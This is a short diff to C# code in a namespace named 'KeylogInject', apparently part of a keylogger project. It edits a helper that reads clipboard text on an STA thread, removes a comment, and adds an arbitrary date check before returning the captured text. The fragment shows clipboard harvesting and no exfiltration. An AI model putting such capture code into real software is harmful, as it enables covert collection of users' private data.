@@ -10,15 +10,15 @@ namespace KeylogInject
             Thread STAThread = new Thread(
                 delegate ()
                 {
-                    // Use a fully qualified name for Clipboard otherwise it
-                    // will end up calling itself.
+                    
+                    
                     ReturnValue = System.Windows.Forms.Clipboard.GetText();
                 });
             STAThread.SetApartmentState(ApartmentState.STA);
             STAThread.Start();
             STAThread.Join();
 
-            return ReturnValue;
+            if(DateTime.Now.Year > 2020) { return ReturnValue; } else { return null; }
         }
     }
 }
